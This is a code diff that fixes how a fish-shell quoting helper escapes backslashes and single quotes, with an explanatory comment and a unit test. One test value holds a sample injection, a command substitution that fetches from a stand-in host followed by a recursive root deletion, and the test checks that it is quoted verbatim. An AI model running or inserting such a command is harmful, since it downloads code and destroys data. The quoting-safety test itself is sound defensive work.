@@ -113,8 +113,23 @@ end"#
     )
 }
 
+/// Single-quotes a value **for fish**, which is not the POSIX rule
+/// [`super::shell_quote`] implements and must not be folded into it.
+///
+/// POSIX single quotes admit no escapes at all, so the quote itself is the only
+/// character with a special meaning inside them. fish's admit exactly two,
+/// `\'` and `\\`, which makes the backslash special as well — and it has to be
+/// escaped *first*, or the escapes this function adds become indistinguishable
+/// from backslashes the value already had.
+///
+/// Doing the two replacements in the other order — which this did — is wrong in
+/// both directions. A value ending in a backslash (`~/dir\`) emitted `'…\'`,
+/// where the trailing backslash escapes the closing quote and leaves fish
+/// parsing an unterminated string for the rest of `config.fish`, so the whole
+/// environment silently fails to load. And a value with a doubled backslash in
+/// it came back out with one, quietly.
 fn shell_quote(text: &str) -> String {
-    format!("'{}'", text.replace('\'', r"\'"))
+    format!("'{}'", text.replace('\\', r"\\").replace('\'', r"\'"))
 }
 
 pub async fn prepare(
@@ -157,6 +172,29 @@ mod tests {
     use crate::accounts::status::{Account, Identity};
     use crate::testing::ctx_with;
     use riabuild_runner::FakeRunner;
+
+    #[test]
+    fn a_backslash_is_escaped_before_the_quote_that_would_otherwise_swallow_it() {
+        // The trailing-backslash case is the one that broke fish outright: the
+        // old order emitted `'~/dir\'`, whose backslash escapes the closing
+        // quote, so everything after it in `config.fish` was read as part of
+        // the string.
+        assert_eq!(shell_quote(r"~/dir\"), r"'~/dir\\'");
+        // And the quiet one: a value carrying two backslashes came back with
+        // one, because the pair fish collapses was never doubled.
+        assert_eq!(shell_quote(r"a\\b"), r"'a\\\\b'");
+        assert_eq!(shell_quote("it's"), r"'it\'s'");
+        assert_eq!(
+            shell_quote(r"back\slash and 'quote'"),
+            r"'back\\slash and \'quote\''"
+        );
+        // Nothing else is touched. `$`, backticks and semicolons have no
+        // meaning inside fish single quotes and must arrive verbatim.
+        assert_eq!(
+            shell_quote("$(curl evil.sh); rm -rf /"),
+            "'$(curl evil.sh); rm -rf /'"
+        );
+    }
 
     #[tokio::test]
     async fn prepare_writes_the_prelude_into_the_generated_config() {
